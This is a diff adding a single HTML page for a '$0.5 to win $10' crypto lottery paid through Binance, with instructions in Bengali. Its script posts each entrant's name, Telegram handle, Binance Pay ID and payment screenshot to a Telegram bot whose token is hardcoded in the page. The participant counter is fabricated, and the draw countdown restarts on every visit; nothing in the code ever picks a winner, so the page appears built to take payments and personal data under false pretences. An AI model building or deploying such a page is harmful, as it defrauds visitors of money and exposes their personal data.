@@ -1,1 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Join & Win $10 Instantly!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff9e6;
+      color: #000;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+    .header {
+      text-align: center;
+      padding: 10px;
+      background-color: #fcd535;
+      color: #000;
+      font-weight: bold;
+      font-size: 1.4rem;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .lottery-box {
+      text-align: center;
+    }
+    .lottery-box .icon {
+      width: 100px;
+      height: 100px;
+      margin: 20px auto;
+      background-image: linear-gradient(45deg, #fcd535, #000);
+      border: 3px solid #000;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: bold;
+      color: #fff;
+    }
+    .price {
+      font-size: 1.5rem;
+      color: #000;
+      margin-bottom: 5px;
+    }
+    .old-price {
+      text-decoration: line-through;
+      color: gray;
+    }
+    .info {
+      font-size: 0.9rem;
+      margin: 10px 0;
+    }
+    .button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      background-color: #fcd535;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1rem;
+      text-align: center;
+      text-decoration: none;
+    }
+    .form {
+      margin-top: 20px;
+    }
+    .form input[type="text"], .form input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    /* Success Modal Style */
+    .success-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .success-box {
+      background-color: white;
+      padding: 25px;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+    }
+    .success-box h2 {
+      color: green;
+      margin-bottom: 10px;
+    }
+    .success-box #countdownTimer {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .success-box .back-button {
+      margin-top: 12px;
+      padding: 10px 20px;
+      background-color: #fcd535;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .note {
+      display: none;
+      text-align: left;
+      padding: 10px;
+      background-color: #fcd535;
+      border-radius: 8px;
+      margin-top: 10px;
+      color: #000;
+      font-weight: bold;
+    }
+    .note .pin {
+      float: right;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">Only $0.5 to Win $10 Instantly!</div>
+    <div class="lottery-box">
+      <div class="icon">$10</div>
+      <div class="price">$0.5 <span class="old-price">$5</span></div>
+      <div class="info">Prize for Top 5 Winners!</div>
+      <div class="info">Current Participants: <span id="participantCount">3</span></div>
+      <div class="info">Winner Announcement: <span id="countdown"></span></div>
+    </div>
+    <div class="note" id="binanceNote">
+      <div>নোট ১: Binance App-এ নিয়ে যাওয়া হচ্ছে, অনুগ্রহ করে একটু অপেক্ষা করুন...</div>
+      <div style="margin-top:8px;">নোট ২ <span class="pin">📌</span>: পেমেন্ট করার পর নিচের ফর্মে আপনার নাম, টেলিগ্রাম ইউজারনেম, Binance Pay ID এবং স্ক্রিনশর্ট জমা দিন।</div>
+    </div>
+    <button class="button" id="binanceBtn">Pay $0.5 via Binance</button>
+
+    <form class="form" id="lotteryForm">
+      <input type="text" name="name" placeholder="Your Name" required>
+      <input type="text" name="telegram" placeholder="Telegram Username" required>
+      <input type="text" name="payid" placeholder="Binance Pay ID" required>
+      <input type="file" name="screenshot" id="screenshot" accept="image/*" required>
+      <button type="submit" class="button">Submit & Join Lottery</button>
+    </form>
+  </div>
+
+  <!-- Modal -->
+  <div class="success-modal" id="successModal">
+    <div class="success-box">
+      <h2>আপনি সফলভাবে লটারিতে জয়েন করেছেন!</h2>
+      <div>ড্র অনুষ্ঠিত হবে:</div>
+      <div id="countdownTimer"></div>
+      <button class="back-button" id="backButton">লটারি পেইজে ফিরে যান</button>
+    </div>
+  </div>
+
+  <script>
+    let initialCount = 3;
+    const startTime = new Date();
+    function updateParticipantCount() {
+      const now = new Date();
+      const hoursPassed = Math.floor((now - startTime) / (1000 * 60 * 60));
+      const newCount = initialCount + Math.floor(hoursPassed / 12);
+      document.getElementById("participantCount").innerText = newCount;
+    }
+    setInterval(updateParticipantCount, 1000);
+    updateParticipantCount();
+
+    const countdownEl = document.getElementById("countdown");
+    const targetDate = new Date();
+    targetDate.setDate(targetDate.getDate() + 10);
+    targetDate.setHours(targetDate.getHours() + 14);
+
+    function updateCountdown() {
+      const now = new Date();
+      const diff = targetDate - now;
+      if (diff <= 0) {
+        countdownEl.innerText = "Winner Announced!";
+        return "Winner Announced!";
+      }
+      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
+      const minutes = Math.floor((diff / (1000 * 60)) % 60);
+      const seconds = Math.floor((diff / 1000) % 60);
+      const formatted = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+      countdownEl.innerText = formatted;
+      return formatted;
+    }
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    document.getElementById('lotteryForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const form = document.getElementById('lotteryForm');
+      const name = form.name.value;
+      const telegram = form.telegram.value;
+      const payid = form.payid.value;
+      const screenshot = document.getElementById('screenshot').files[0];
+
+      const caption = `New Lottery Entry\nName: ${name}\nTelegram: @${telegram}\nPay ID: ${payid}`;
+      const botToken = '8112295887:AAHTaXjICjJs1cXtxMGfuez_kR24O9wyI7I';
+      const chatId = '7523730461';
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', caption);
+      formData.append('document', screenshot);
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          const modal = document.getElementById('successModal');
+          modal.style.display = 'flex';
+
+          // Start live countdown inside modal
+          setInterval(() => {
+            document.getElementById('countdownTimer').innerText = updateCountdown();
+          }, 1000);
+        } else {
+          alert("Something went wrong: " + data.description);
+        }
+      })
+      .catch(error => {
+        alert('Error sending data to Telegram.');
+        console.error(error);
+      });
+    });
+
+    document.getElementById('binanceBtn').addEventListener('click', function () {
+      const note = document.getElementById('binanceNote');
+      note.style.display = 'block';
+      setTimeout(() => {
+        window.location.href = 'https://s.binance.com/wdMhflbY';
+      }, 5000);
+    });
+
+    document.getElementById('backButton').addEventListener('click', function() {
+      location.reload(); // This will refresh the page immediately
+    });
+  </script>
+</body>
+</html>
 
